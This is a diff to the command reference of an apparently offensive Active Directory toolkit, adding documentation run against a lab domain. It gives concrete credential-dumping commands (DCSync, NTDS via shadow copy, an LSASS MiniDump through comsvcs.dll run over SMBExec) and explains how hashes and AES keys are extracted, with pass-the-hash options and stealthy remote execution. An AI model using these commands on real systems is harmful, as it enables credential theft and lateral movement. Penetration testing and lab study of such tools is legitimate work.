@@ -1,4 +1,4 @@
-# Overthrone v0.4.8 — Complete Command Reference
+# Overthrone v0.4.9 — Complete Command Reference
 
 > Real usage examples for every command across all 9 crates.
 > Tested against GOAD-Light (WS2019 DCs) — `sevenkingdoms.local` (192.168.57.10)
@@ -421,7 +421,9 @@ ovt dump 192.168.57.10 dcsync -d sevenkingdoms.local -u vagrant -p vagrant
 # Creates a Volume Shadow Copy, reads NTDS.dit + SYSTEM directly via @GMT- path
 ovt dump 192.168.57.10 ntds-vss -d sevenkingdoms.local -u vagrant -p vagrant
 
-# LSASS dump via comsvcs.dll (Windows)
+# LSASS dump via comsvcs.dll MiniDump (cross-platform minidump parsing)
+# Dumps LSASS memory via SMBExec + comsvcs.dll, downloads minidump, parses in Rust
+# Supports --user/--nt-hash/--kerberos for auth; extracts NTLM hashes + AES-256 keys
 ovt dump 192.168.57.10 lsass -d sevenkingdoms.local -u vagrant -p vagrant
 
 # SAM registry hive dump (requires local admin)
@@ -441,6 +443,10 @@ ovt dump 192.168.57.10 all -d sevenkingdoms.local -u vagrant -p vagrant
 |---|---|---|
 | `--target`, `-t` | required | Target host |
 | `source` | (positional, required) | `sam`, `lsa`, `ntds`, `dcc2`, `lsass`, `ntds-vss`, `all` |
+
+**LSASS dump flow:** The `lsass` source uses SMBExec to run `rundll32.exe comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\Temp\lsass.dmp full` on the target, then downloads the dump file via SMB and parses it with the built-in cross-platform minidump parser. The parser extracts NTLM hashes (NT hash, LM hash), AES-256 session keys, and usernames from the minidump memory regions. If the direct download fails (WS2025 sandbox), it falls back to creating the dump via MS-EVEN RPC (`ElfrClearLogFileW`).
+
+**Authentication modes:** Password (`-p`), NTLM hash (`--nt-hash`), or Kerberos ticket (`--kerberos <kirbi_path>`).
 
 ---
 
@@ -1306,6 +1312,12 @@ ovt exec --target DC01.local --target-ip 192.168.57.10 --command "whoami" \
 | `smbexec` | SCM over SMB | Service-based, slightly sneakier |
 | `wmiexec` | DCOM/WMI | WMI semi-interactive, Windows-only |
 | `winrm` | WS-Management | Native Windows remote management |
+
+**Output display:** Successful execution shows byte count. Empty output shows diagnostic tips (WS2025 sandbox may block file creation). Failed execution shows `[!]` with failure reason.
+
+**SMB error diagnostics:** File operations (`smb get`, `smb put`) now show targeted error messages:
+- `STATUS_OBJECT_PATH_NOT_FOUND` (0xC000003A): suggests parent directory may not exist
+- `STATUS_ACCESS_DENIED` (0xC0000022): suggests checking user permissions on the share
 
 ---
 
